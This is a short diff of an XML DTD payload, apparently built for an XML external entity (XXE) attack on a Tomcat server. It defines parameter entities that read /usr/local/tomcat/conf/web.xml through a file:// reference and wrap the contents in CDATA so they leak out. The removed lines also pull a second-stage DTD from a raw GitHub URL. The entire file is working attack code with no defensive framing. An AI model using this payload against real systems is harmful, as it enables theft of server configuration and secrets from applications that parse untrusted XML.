@@ -1,5 +1,5 @@
-<!ENTITY % file SYSTEM "file:///usr/local/tomcat/conf/web.xml">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % dtd2 SYSTEM "https://raw.githubusercontent.com/NgoTrongThuan01/LCS/refs/heads/main/stage2.dtd">
-%dtd2;
+<!ENTITY % burger_1 "<![CDATA[">
+<!ENTITY % parameter_external_entity_leak_webxml SYSTEM "file:///usr/local/tomcat/conf/web.xml">
+<!ENTITY % burger_2 "]]>">
+
+<!ENTITY external_dtd_subset_leak_full "%burger_1;%parameter_external_entity_leak_webxml;%burger_2;">
